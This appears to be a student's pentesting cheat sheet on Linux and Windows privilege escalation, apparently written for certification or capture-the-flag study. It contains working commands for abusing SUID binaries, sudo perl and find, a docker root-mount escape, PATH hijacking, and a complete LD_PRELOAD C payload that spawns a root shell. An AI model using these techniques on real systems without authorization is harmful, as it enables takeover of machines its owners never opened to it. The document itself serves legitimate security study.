## privilege scalation

find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;
 sudo find / -type f -perm -7000
"find / -perm -u=s -type f 2>/dev/null" to search the file system for SUID/GUID files.  

locate command = find files and folders

sudo -l = to see possible sudo commands 


- GTFOBins

https://gtfobins.github.io

PowerUp.ps1
Linpeas  
Linenum 

if we can run usr/bin/perl as sudo we can ----- sudo perl -e 'exec "bin//sh",'



## Privilege escalation

### [](https://github.com/dustypioneer/pentest_plus/tree/master/attacks_and_exploits/3.5#linux-specific)Linux-specific

- SUID/SGID programs (Set User ID, Set Group ID) - Crashing out of a program that runs as an elevated user may give an elevated prompt
- Unsecure SUDO - Authorized users execute commands as if root
- Ret2libc - stack overflow attack. Replaces current stack return address with attacker-chosen address of another subroutine. Libc includes useful calls, such as 'system'.
- Sticky bits - Directory permission which sets a permission that allows multiple users to create, read, and write files & executables but only the owner can delete them.


Enumeration:
 
 hostname
 
 uname -a : kernel info
 
 /proc/version:  
 
 /etc/issue: may find OS info and kernel info 
 
 PS command for processes
 
 sudo -l 
 
 id 
 
 ifconfig for pivoting 
 
 iproute
 
 -------------------------------------------------------
 findcommand 
 
 • find . -name flag1.txt: find the file named “flag1.txt” in thecurrent directory
• find /home -name flag1.txt: find the file names “flag1.txt” inthe /home directory
• find / -type d -name config: find the directory named config under “/”
• find / -type f -perm 0777: find files with the 777 permissions(files readable, writable, and executable by all users)
• find / -perm a=x: find executable files
• find /home -user frank: find all files for user “frank” under“/home”
• find / -mtime 10: find files that were modified in the last 10days
• find / -atime 10: find files that were accessed in the last 10day
• find / -cmin -60: find files changed within the last hour (60minutes)
• find / -amin -60: find files accesses within the last hour (60minutes)
• find / -size 50M: find files with a 50 MB size

find /-perm -o x -type d 2>/dev/null - world executable 

find / -perm -u=s -type f 2>/dev/null: Find files with the SUIDbit


Automated tools 


• LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
• LinEnum: https://github.com/rebootuser/LinEnum
• LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
• Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
• Linux Priv Checker: https://github.com/linted/linuxprivchecker



WE can use find command to get flags and execute commands as root 
 find /root -exec cat /root/root.txt \;  
 
 
 ----------DOCKER---------------------------
 
 id command 
 
 
 if we belong to a docker we can use 
 
 docker run -v /:/mnt --rm -it bash chroot /mnt bash
 
 
 
 
 
 sudo -l 
------ LD_PRELOAD

1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
The C code will simply spawn a root shell and can be written as follows;
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;
gcc -fPIC -shared -o shell.so shell.c -nostartfiles


### [](https://github.com/dustypioneer/pentest_plus/tree/master/attacks_and_exploits/3.5#windows-specific)Windows-specific

- Cpassword - Group policy preference attribute that contains passwords. SYSVOL folder of the domain controller (encrypted XML)
- Clear text credentials in LDAP
- Kerberoasting - Domain users that can query Kerberos tickets for other users.
- Credentials in LSASS (Local Security Authority Subsystem Service) - Enforces security policy
- Unattended installation - PXE (Preboot Execution Environment) may contain credentials
- SAM database (Security Account Manager) - Database that contains user passwords
- DLL hijacking (Dynamic Link Library) - Forcing a loader to load a malicious DLL

### [](https://github.com/dustypioneer/pentest_plus/tree/master/attacks_and_exploits/3.5#exploitable-services)Exploitable services

- Unquoted service paths - Allows abbreviated attack paths without spaces. IE "C:\Program Files" vs C:\Program\Files
- Writable services - The ability to write and change the path to the service
- Unsecure file/folder permissions - Allowing read/write by non root users
- Keylogger - records every keystroke.
- Scheduled tasks - Attacker may add tasks which run with elevated privlidges.
- Kernel exploits

## [](https://github.com/dustypioneer/pentest_plus/tree/master/attacks_and_exploits/3.5#default-account-settings)Default account settings

Defaults should be disabled or renamed. Default passwords should always be changed.

## [](https://github.com/dustypioneer/pentest_plus/tree/master/attacks_and_exploits/3.5#sandbox-escape)Sandbox escape

- Shell upgrade - gaining access to a shell on the host system, with root privliges.
- VM - Virtual Machine
- Container

## [](https://github.com/dustypioneer/pentest_plus/tree/master/attacks_and_exploits/3.5#physical-device-security)Physical device security

- Cold boot attack - Rebooting a system and launching a different OS may allow access to things such as encryption keys or password databases.
- JTAG debug - (Joint Test Action Group) - Allows for attackers to debug hardware. Industry standard for debugging circuit boards.
- Serial console - Direct access to servers and network gear.


## $PATH VARIABLE ESCALATION

echo $PATH 

export PATH=/tmp:$PATH

export the writable folder to path and then run the executable wich calls the binary in tmp 

“vulnerability is created when a binary calls an executable but does not specify the path so linux check the path variable”

https://www.youtube.com/watch?v=7WQndt-1WzE

we get the root shell



## Windows privesc

we run whoami /priv ------->to see how can we elevate priviledges 




we check for possible ways to elevate


softwares 

winpeas 

Juicy Potato is normally used to exploit token impersonation
PrintSpoofer.exe 
